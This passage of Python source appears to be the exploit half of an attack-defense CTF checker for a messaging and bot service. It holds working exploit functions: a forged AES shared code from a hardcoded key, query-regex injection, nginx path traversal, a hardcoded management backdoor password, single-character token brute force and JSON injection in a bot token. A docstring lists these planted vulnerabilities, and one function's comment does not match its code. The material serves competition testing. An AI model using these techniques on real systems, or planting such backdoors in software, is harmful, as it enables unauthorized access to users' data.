    storetype, username = task.attack_info.split(':', 1)
    if storetype != 'username':
        raise MumbleException("Exploit: Wrong flagstore")

    #key = "forgot-your-key?"
    key = "da-pUm4s-ar3hEr3"
    data = {"n": username}
    
    cipher = AES.new(key.encode(), AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(json.dumps(data).encode(), AES.block_size))
    iv = binascii.hexlify(cipher.iv).decode()
    ct = binascii.hexlify(ct_bytes).decode()
    code = iv + ct

    # Use forged code to access inbox
    msgs = await do_shared(logger, client, code)
    try:
        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
    except Exception as e:
        raise MumbleException("Failed to recover inbox")
    
    flag = searcher.search_flag(msgs)
    if flag is not None:
        return flag
    raise MumbleException("Exploit (shared code forge) for flagstore 1 failed")

@checker.exploit(2)
async def exploit_store1_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Exploit: forge a session token to impersonate the victim user and read their messages
    # This assumes the session token is a JWT with {"username": username} and a known secret

    assert task.attack_info is not None
    storetype, username = task.attack_info.split(':', 1)
    if storetype != 'username':
        raise MumbleException("Exploit: Wrong flagstore")

    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|exploit_store2_d|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    botname = gen.genStr(gen.genInt(8,12))
    bottoken = gen.genStr(gen.genInt(32,64))

    await do_register(logger, client, username, password)
    token = await do_login(logger, client, username, password)


    search_query_exploit = {
        "text": {
            "$regex": ".*",
        },
        "$or": [
            {"sender": username},
            {"receiver": username}
        ]
    }
    msgs = await do_search(logger, client, search_query_exploit, token)
    try:
        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
    except Exception as e:
        logger.error(f"Invalid search response during havoc_store1: " + f"\n{msgs}")
        raise MumbleException("Invalid search response")

    flag = searcher.search_flag(msgs)
    if flag is not None:
        return flag
    raise MumbleException("Exploit (search vuln) for flagstore 1 failed")

'''
2nd flag store (flag in bot's code)
- backdoor in mng
	- Send `AUTHEN botname n1s4_w4s_HEr3?` to authenticate
	- Send `GETCODE`
- vulnerability in mng
	- Send `AUTHEN botname <first letter of token>` to authenticate
	- Send `GETCODE`
- vulnerability in storing bot info
	- Create bot with JSON injection in token value to override bot name `token","name":"targetbotname`
	- Upload valid bot code with `debug` command
	- Execute `debug` command to load the code of another bot
- vulnerability on proxy (path traversal)
	- /static../bots/botname.code
'''
@checker.exploit(3)
async def exploit_store2_a(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Exploit: path traversal in nginx to access bot code and recover flag

    assert task.attack_info is not None
    storetype, botname = task.attack_info.split(':', 1)
    if storetype != 'botname':
        raise MumbleException("Exploit: Wrong flagstore")

    r = await client.get(f"/static../bots/{botname}.code")
    assert_status_code(logger, r, code=200)
    botcode = r.text

    path = f"/static/bots/../{botname}.json"
    code = await do_download(logger, client, path)

    text = None
    try:
        code = json.loads(code)
        text = ' '.join([v for v in code.values() if isinstance(v, str)])
    except Exception as e:
        logger.error(f"The bot code returned is not valid:\n{e}")
        raise MumbleException("Faulty bot code returned")
    
    flag = searcher.search_flag(text)
    if flag is not None:
        return flag
    raise MumbleException("Exploit (nginx path traversal) for flagstore 2 failed")

@checker.exploit(4)
async def exploit_store2_b(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Exploit: back door in mng to access bot code and recover flag

    assert task.attack_info is not None
    storetype, botname = task.attack_info.split(':', 1)
    if storetype != 'botname':
        raise MumbleException("Exploit: Wrong flagstore")

    socket = do_socket_connect(logger, task.address)
    do_socket_auth(logger, socket, botname, 'n1s4_w4s_HEr3?')
    code = do_socket_getcode(logger, socket)

    text = None
    try:
        code = json.loads(code)
        text = ' '.join([v for v in code.values() if isinstance(v, str)])
    except Exception as e:
        logger.error(f"The bot code returned is not valid:\n{e}")
        raise MumbleException("Faulty bot code returned")
    
    flag = searcher.search_flag(text)
    if flag is not None:
        return flag
    raise MumbleException("Exploit (mng backdoor) for flagstore 2 failed")

@checker.exploit(5)
async def exploit_store2_c(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Exploit: bot token match vulnerability in mng to access bot code and recover flag

    assert task.attack_info is not None
    storetype, botname = task.attack_info.split(':', 1)
    if storetype != 'botname':
        raise MumbleException("Exploit: Wrong flagstore")

    socket = do_socket_connect(logger, task.address)

    hacked = False
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        try:
            do_socket_auth(logger, socket, botname, c)
            hacked = True
            break
        except MumbleException:
            pass
    
    if hacked:
        code = do_socket_getcode(logger, socket)

        text = None
        try:
            code = json.loads(code)
            text = ' '.join([v for v in code.values() if isinstance(v, str)])
        except Exception as e:
            logger.error(f"The bot code returned is not valid:\n{e}")
            raise MumbleException("Faulty bot code returned")
        
        flag = searcher.search_flag(text)
        if flag is not None:
            return flag
    
    raise MumbleException("Exploit (mng backdoor) for flagstore 2 failed")

@checker.exploit(6)
async def exploit_store2_d(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Exploit: bot token json injection vulnerability in mng to access bot code and recover flag
	
    assert task.attack_info is not None
    storetype, target_botname = task.attack_info.split(':', 1)
    if storetype != 'botname':
        raise MumbleException("Exploit: Wrong flagstore")

    gen = RandomGenerator(seed=f"{CHECKER_ENTROPY_SECRET_SEED}|exploit_store2_d|{task.task_id}")
    username = gen.genStr(gen.genInt(8,12))
    password = gen.genStr(gen.genInt(12,16))
    botname = gen.genStr(gen.genInt(8,12))
    bottoken = gen.genStr(gen.genInt(32,64))

    await do_register(logger, client, username, password)
    token = await do_login(logger, client, username, password)

    await do_register_bot(logger, client, botname, bottoken + '","name":"' + target_botname, token)

    socket = do_socket_connect(logger, task.address)
    do_socket_auth(logger, socket, botname, bottoken)
    
    code = {
        "init" : [
            {
                "match" : ".*",
                "actions" : [
                    ["debug"]
                ]
            }
        ]
    }
    do_socket_setcode(logger, socket, code)

    await do_send(logger, client, botname, 'any', token)
    msgs = await do_get_inbox(logger, client, token)
    try:
        msgs = ' '.join([(msg['text'] if 'text' in msg else '-') for msg in msgs])
    except Exception as e:
        raise MumbleException("Failed to recover inbox")
    
    flag = searcher.search_flag(msgs)
    if flag is not None:
        return flag

    raise MumbleException("Exploit (json injection) for flagstore 2 failed")


if __name__ == "__main__":
    checker.run()

